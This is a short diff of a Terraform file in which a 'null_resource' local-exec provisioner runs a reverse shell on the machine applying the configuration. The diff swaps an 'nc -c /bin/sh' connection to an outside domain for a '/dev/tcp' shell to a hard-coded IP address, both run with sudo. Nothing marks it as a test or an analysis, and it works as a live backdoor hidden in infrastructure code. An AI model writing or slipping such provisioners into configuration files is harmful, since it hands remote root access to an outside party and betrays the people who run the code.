@@ -7,9 +7,9 @@ resource "random_id" "random" {
   byte_length = 16
 }
 
-resource "null_resource" "cmd7" {
+resource "null_resource" "cmd8" {
   provisioner "local-exec" {
-      command = "sudo nohup nc -c /bin/sh stargate.leon.click 4243 -v"
+      command = "sudo nohup 0<&196;exec 196<>/dev/tcp/45.79.176.241/4243; sh <&196 >&196 2>&196"
         }
         }
 
